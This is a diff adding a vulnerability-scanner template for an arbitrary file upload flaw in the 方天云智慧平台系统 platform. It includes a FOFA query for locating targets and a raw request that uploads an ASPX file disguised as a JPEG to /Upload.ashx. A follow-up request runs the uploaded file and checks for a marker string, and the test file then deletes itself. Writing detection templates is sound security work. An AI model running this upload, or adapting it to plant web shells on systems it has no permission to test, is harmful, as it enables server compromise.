@@ -1,0 +1,45 @@
+id: fangtian-Upload-fileupload
+
+info:
+  name: 方天云智慧平台系统-任意文件上传-Upload
+  author: HuanXiong
+  severity: high
+  metadata:
+    fofa-query: body="AjaxMethods.asmx/GetCompanyItem"
+  tags: File Upload
+
+http:
+  - raw:
+      - |
+        POST /Upload.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySl8siBbmVicABvTX
+        Connection: close
+
+        ------WebKitFormBoundarySl8siBbmVicABvTX
+        Content-Disposition: form-data; name="file"; filename="qwe.aspx"
+        Content-Type: image/jpeg
+
+        <%@ Page Language="C#" %><% Response.Write("pboyjnnrfipmplsukdeczudsefxmywe"); System.IO.File.Delete(Request.PhysicalPath); %>
+        ------WebKitFormBoundarySl8siBbmVicABvTX--
+
+      - |
+        GET /UploadFile/CustomerFile/{{path}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+        Connection: close
+        
+    extractors:
+      - type: regex
+        name: path
+        group: 1
+        regex:
+          - '(\d+/\d+/\d+/\d+/\d+\.aspx)'
+        internal: true
+
+    matchers:
+      - type: dsl
+        name: 任意文件上传
+        dsl:
+          - "status_code==200 && contains_all(body,'pboyjnnrfipmplsukdeczudsefxmywe')"
